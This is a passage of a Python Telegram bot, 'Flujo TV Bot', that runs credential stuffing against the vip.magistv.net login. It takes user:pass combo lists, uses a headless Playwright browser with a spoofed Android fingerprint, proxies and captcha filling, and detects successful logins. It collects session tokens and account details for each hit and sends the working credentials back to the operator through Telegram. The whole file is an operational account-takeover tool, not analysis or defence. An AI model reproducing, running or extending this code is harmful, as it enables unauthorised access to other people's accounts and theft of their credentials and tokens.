                                                inp.tap(); inp.fill(""); inp.fill(ct); cap_filled = True; break
                                    except: pass
                        except: pass

                    state["clicked_at"] = time.time(); state["api_hit"] = False
                    for sel in ['button[type="submit"]','button:has-text("Login")','.ant-btn-primary','button[class*="login"]']:
                        try:
                            el = page.locator(sel).first
                            if el.is_visible(timeout=500): el.tap(); break
                        except: continue

                    success = False
                    for w in range(20):
                        if state.get("login_ok"): success = True; break
                        if "/mobile/home" in page.url: success = True; break
                        try:
                            for c in context.cookies():
                                if "msgistv-token" in c.get("name","") and c.get("value"): success = True; break
                        except: pass
                        if success: break
                        if state.get("api_hit") and state["login_code"] != 200: break
                        if w >= 3 and not state.get("api_hit"):
                            pe = get_page_errors(page)
                            if pe: break
                        page.wait_for_timeout(800)

                    if success: login_success = True; break
                    msg = (state.get("login_msg") or "").lower()
                    if any(k in msg for k in ["captcha","código","codigo","code","valida"]):
                        try:
                            for sel in ['input[placeholder="validateCode"]','input[placeholder*="code" i]']:
                                el = page.locator(sel).first
                                if el.is_visible(timeout=400): el.fill("")
                        except: pass
                        continue
                    break

                if state.get("api_hit") and is_ip_restricted(state.get("login_msg","")):
                    fails += 1; stats["fails"] += 1; errors["IP Restringida"] = errors.get("IP Restringida",0)+1
                    update_progress(chat_id, msg_id, user, "🚫 IP restringida", stats); idx += 1; ip_restricted = True; break

                if login_success or state.get("login_ok") or "/mobile/home" in page.url:
                    if not state.get("token"):
                        try:
                            for c in context.cookies():
                                if "msgistv-token" in c.get("name",""): state["token"] = c.get("value"); break
                        except: pass
                    try: page.goto("https://vip.magistv.net/mobile/home", wait_until="domcontentloaded", timeout=12000)
                    except: pass
                    for _ in range(12):
                        if state.get("info") and state.get("dashboard"): break
                        page.wait_for_timeout(800)
                    if not state.get("info") or not state.get("dashboard"):
                        try: page.reload(wait_until="domcontentloaded", timeout=8000); page.wait_for_timeout(2500)
                        except: pass

                    info = state.get("info") or {}; dash = state.get("dashboard") or {}
                    rev = "✅" if info.get("is_revendedor") else "❌"; sup = "✅" if info.get("is_super") else "❌"
                    hits.append({"username":user,"password":pwd,"info":info,"dashboard":dash,"token":state.get("token")})
                    hits_lines.append(f"{user}:{pwd}"); stats["hits"] += 1
                    detail = f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name','—')}\n🆔 {info.get('id','—')}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 Total:{dash.get('sumNum',0)} ✅ Act:{dash.get('activeNum',0)}"
                    update_progress(chat_id, msg_id, user, f"💰 HIT! Rev={rev}", stats)
                    try: tg_send_msg(chat_id, detail, disable_notification=True)
                    except: pass
                    print(f"  [💰] HIT #{len(hits)} — {user}")
                else:
                    fails += 1; stats["fails"] += 1
                    if state.get("api_hit"): reason = translate_err(state["login_code"], state["login_msg"])
                    else:
                        pe = get_page_errors(page)
                        reason = pe[0] if pe else "Sin respuesta"
                    errors[reason] = errors.get(reason, 0) + 1
                    update_progress(chat_id, msg_id, user, reason, stats)

                idx += 1
                time.sleep(0.3)

            try: context.close()
            except: pass
            if ip_restricted: continue

        try: browser.close()
        except: pass
    return hits, hits_lines

# ════════════════════════════════════════════════════════════════════════
#  START CHECK
# ════════════════════════════════════════════════════════════════════════

waiting_combo = set()

def start_check(accounts, chat_id, use_proxy=True):
    if bot_state["running"]: tg_send_msg(chat_id, "⏳ Ocupado.", reply_markup=kb_main()); return
    if os.path.exists(STOP_FILE): os.remove(STOP_FILE)
    bot_state["running"] = True; bot_state["current_chat"] = chat_id
    bot_state["_start_time"] = time.time(); bot_state["debug_sent"] = 0
    mode = "PROXY" if use_proxy else "SIN PROXY"
    tg_send_msg(chat_id, f"🚀 <b>Check {mode}</b>\n📊 {len(accounts)} cuentas")
    r = tg_send_msg(chat_id, "⏳ Preparando...", reply_markup=kb_cancel())
    prog_msg_id = r.get("result",{}).get("message_id") if r.get("ok") else None

    def worker(accounts, chat_id, prog_msg_id, use_proxy):
        try:
            hits, hits_lines = run_checker(accounts, chat_id, prog_msg_id, use_proxy)
            elapsed = time.time() - bot_state["_start_time"]
            if hits_lines:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                tg_send_doc(chat_id, f"hits_{ts}.txt", "\n".join(hits_lines), caption=f"📦 {len(hits_lines)} hits")
            summary = f"━━━ <b>FIN</b> ━━━\n📊 {len(accounts)} │ 💰<b>{len(hits_lines)}</b> │ ❌{len(accounts)-len(hits_lines)}\n⏱ {int(elapsed//60)}m{int(elapsed%60)}s"
            if prog_msg_id: tg_edit_msg(chat_id, prog_msg_id, summary, reply_markup=kb_main())
            else: tg_send_msg(chat_id, summary, reply_markup=kb_main())
        except Exception as e:
            print(f"  [✗] {e}\n{traceback.format_exc()[-400:]}")
            try: tg_send_msg(chat_id, f"❌ <code>{escape_html(str(e)[:200])}</code>", reply_markup=kb_main())
            except: pass

    p = multiprocessing.Process(target=worker, args=(accounts, chat_id, prog_msg_id, use_proxy), daemon=True)
    p.start(); bot_state["_process"] = p

# ════════════════════════════════════════════════════════════════════════
#  UPDATES
# ════════════════════════════════════════════════════════════════════════

def process_update(upd):
    global ADMIN_IDS
    msg = upd.get("message"); cbq = upd.get("callback_query")

    if msg:
        chat_id = msg["chat"]["id"]; user_id = msg.get("from",{}).get("id")
        text = msg.get("text",""); is_doc = "document" in msg
        if user_id and user_id not in ADMIN_IDS: ADMIN_IDS.append(user_id)

        if chat_id in waiting_combo:
            waiting_combo.discard(chat_id)
            use_proxy = not bot_state.get("force_no_proxy", False)
            bot_state["force_no_proxy"] = False
            if is_doc:
                file_data = tg_download_file(msg["document"]["file_id"])
                if file_data:
                    accounts = parse_combo(file_data.decode("utf-8", errors="ignore"))
                    if accounts: tg_send_msg(chat_id, f"📄 <b>{len(accounts)}</b> cuentas"); start_check(accounts, chat_id, use_proxy)
                    else: tg_send_msg(chat_id, "❌ Inválidas.", reply_markup=kb_main())
                else: tg_send_msg(chat_id, "❌ Error descarga.", reply_markup=kb_main())
                return
            elif text and not text.startswith("/"):
                accounts = parse_combo(text)
                if accounts: start_check(accounts, chat_id, use_proxy)
                else: tg_send_msg(chat_id, "❌ <code>user:pass</code>", reply_markup=kb_main())
                return
            else:
                waiting_combo.add(chat_id)
                tg_send_msg(chat_id, "📤 Envía combo", reply_markup=kb_cancel()); return

        if text == "/start": tg_send_msg(chat_id, "🎬 <b>Flujo TV Bot</b>", reply_markup=kb_main())
        elif text == "/check":
            if bot_state["running"]: tg_send_msg(chat_id, "⏳ Ocupado.", reply_markup=kb_main())
            else: waiting_combo.add(chat_id); bot_state["force_no_proxy"] = False; tg_send_msg(chat_id, "📤 Combo (PROXY):", reply_markup=kb_cancel())
        elif text in ["/local","/checknoproxy"]:
            if bot_state["running"]: tg_send_msg(chat_id, "⏳ Ocupado.", reply_markup=kb_main())
            else: waiting_combo.add(chat_id); bot_state["force_no_proxy"] = True; tg_send_msg(chat_id, "🌐 Combo (SIN PROXY):", reply_markup=kb_cancel())
        elif text == "/testcf":
            if not bot_state["running"]: threading.Thread(target=test_cf_diagnostic, args=(chat_id,), daemon=True).start()
        elif text == "/stop":
            if bot_state["running"]: open(STOP_FILE,'w').write("1"); tg_send_msg(chat_id, "⏹ Deteniendo...")
            else: tg_send_msg(chat_id, "Nada corriendo.", reply_markup=kb_main())
        elif text.startswith("/proxy"):
            parts = text.split()
            if len(parts) >= 5:
                PROXY["host"]=parts[1]; PROXY["port"]=int(parts[2]); PROXY["user"]=parts[3]; PROXY["pass"]=parts[4]
                tg_send_msg(chat_id, f"🔄 <code>{PROXY['host']}:{PROXY['port']}</code>", reply_markup=kb_main())

    elif cbq:
        chat_id = cbq["message"]["chat"]["id"]; user_id = cbq.get("from",{}).get("id")
        data = cbq.get("data",""); msg_id = cbq["message"]["message_id"]
        if user_id and user_id not in ADMIN_IDS: ADMIN_IDS.append(user_id)
        if data == "send_combo":
            if bot_state["running"]: tg_answer_cb(cbq["id"],"Ocupado",show_alert=True)
            else: waiting_combo.add(chat_id); bot_state["force_no_proxy"]=False; tg_edit_msg(chat_id,msg_id,"📤 Combo (PROXY):",reply_markup=kb_cancel()); tg_answer_cb(cbq["id"])
        elif data == "send_local":
            if bot_state["running"]: tg_answer_cb(cbq["id"],"Ocupado",show_alert=True)
            else: waiting_combo.add(chat_id); bot_state["force_no_proxy"]=True; tg_edit_msg(chat_id,msg_id,"🌐 Combo (SIN PROXY):",reply_markup=kb_cancel()); tg_answer_cb(cbq["id"])
        elif data == "test_cf":
            if not bot_state["running"]: threading.Thread(target=test_cf_diagnostic,args=(chat_id,),daemon=True).start()
            else: tg_answer_cb(cbq["id"],"Ocupado",show_alert=True)
        elif data == "stop":
            if bot_state["running"]: open(STOP_FILE,'w').write("1"); tg_answer_cb(cbq["id"],"Deteniendo...")
            else: tg_answer_cb(cbq["id"],"Nada",show_alert=True)
        elif data == "cancel_check":
            waiting_combo.discard(chat_id); tg_edit_msg(chat_id,msg_id,"🎬 Listo.",reply_markup=kb_main()); tg_answer_cb(cbq["id"])

# ════════════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════════════

def main():
    print("\n  ╔═══════════════════════════════════════════════════╗")
    print("  ║  🎬 Flujo TV Bot (VPS + Xvfb + Android Stealth)  ║")
    print("  ╚═══════════════════════════════════════════════════╝\n")
    print("  [*] Dependencias...")
    pw_ok, ocr_ok = setup_deps()
    if not pw_ok: sys.exit(1)

    display = os.environ.get("DISPLAY",":99")
    try:
        r = subprocess.run(["xdpyinfo"],capture_output=True,text=True,timeout=5)
        if r.returncode != 0:
            print("  [*] Iniciando Xvfb...")
            subprocess.Popen(["Xvfb",display,"-screen","0","1280x1024x24","-ac"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            time.sleep(2)
    except FileNotFoundError:
        subprocess.Popen(["Xvfb",display,"-screen","0","1280x1024x24","-ac"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        time.sleep(2)

    print(f"  [✓] Playwright | OCR:{'✅' if ocr_ok else '❌'} | Xvfb:{display}")
    print(f"  [✓] Proxy: {PROXY['host']}:{PROXY['port']}")
    print(f"  [✓] Fingerprint: Android 10 + Chrome 127 + Adreno 640")
    print(f"  [✓] Comandos: /check /local /testcf /stop\n")
    tg_api("deleteWebhook",{"drop_pending_updates":True})
    print("  [✓] Bot listo.\n")

    offset = None
    while True:
        if bot_state["running"] and bot_state.get("_process") and not bot_state["_process"].is_alive():
            bot_state["running"] = False; bot_state["current_chat"] = None; print("  [*] Check finalizado.")
        try:
            params = {"timeout":35,"allowed_updates":'["message","callback_query"]'}
            if offset: params["offset"] = offset
            result = tg_api("getUpdates",params,timeout=40)
            if result.get("ok") and result.get("result"):
                for upd in result["result"]:
                    try: process_update(upd)
                    except Exception as e: print(f"  [!] {e}")
                    offset = upd["update_id"] + 1
        except urllib.error.URLError: time.sleep(5)
        except: time.sleep(3)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\n  [*] Stop.")
    except Exception as e: print(f"\n  [✗] {e}"); traceback.print_exc()
